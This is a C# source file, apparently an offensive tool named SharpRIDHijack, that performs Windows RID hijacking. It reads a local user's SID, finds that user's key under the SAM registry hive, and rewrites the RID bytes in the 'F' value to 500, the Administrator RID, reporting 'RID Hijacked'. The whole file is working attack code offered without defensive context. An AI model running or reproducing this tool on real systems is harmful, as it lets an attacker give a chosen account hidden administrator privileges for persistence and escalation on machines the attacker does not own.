using System;
using Microsoft.Win32;
using System.DirectoryServices.AccountManagement;
using System.Security.Principal;

namespace SharpRIDHijack
{
    public class rid
    {

        public static int GetUserRID(string username)
        {
            try
            {
                using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
                {
                    UserPrincipal existingUser = UserPrincipal.FindByIdentity(context, IdentityType.SamAccountName, username);

                    if (existingUser != null)
                    {
                        SecurityIdentifier sid = existingUser.Sid;
                        string rid = sid.Value.Split('-')[7];
                        Console.WriteLine($"[+] Extracted user RID: {rid}");
                        return int.Parse(rid);
                    }
                    else
                    {
                        Console.WriteLine("User not found.");
                        return -1;
                    }

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return -1;
            }

        }




        public static void Hijack(string username)
        {
            Console.WriteLine($"[+] Elevating: {username}");
            int rid = GetUserRID(username);
            string hexrid = "00000" + rid.ToString("X");
            byte[] ridbytes = BitConverter.GetBytes(rid);

            Console.WriteLine($"[+] hex rid: {hexrid}");


            string keypath = $"SAM\\SAM\\Domains\\Account\\Users\\{hexrid}";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(keypath, true))
            {
                try
                {
                    if (key != null)
                    {
                        Console.WriteLine("[+] Opened The User Key");
                        object value = key.GetValue("F");
                        byte[] byteval = (byte[])value;
                        byte[] newval = new byte[byteval.Length];

                        for (int i = 0; i < byteval.Length; i++)
                        {
                            if (byteval[i] == ridbytes[0] && byteval[i + 1] == ridbytes[1])
                            {
                                byteval[i] = BitConverter.GetBytes(500)[0];
                                byteval[i + 1] = 0x01;
                            }


                        }

                        Console.WriteLine("[+] Constructed The New Registry Value");

                        key.SetValue("F", byteval);
                        key.Close();
                        Console.WriteLine("[+] RID Hijacked !");

                    }
                    else
                    {
                        Console.WriteLine("[-] Failed to create or open registry key.");
                    }
                }
                catch (Exception ex) { Console.WriteLine("Error: " + ex.Message); }
            }

        }






    }
}
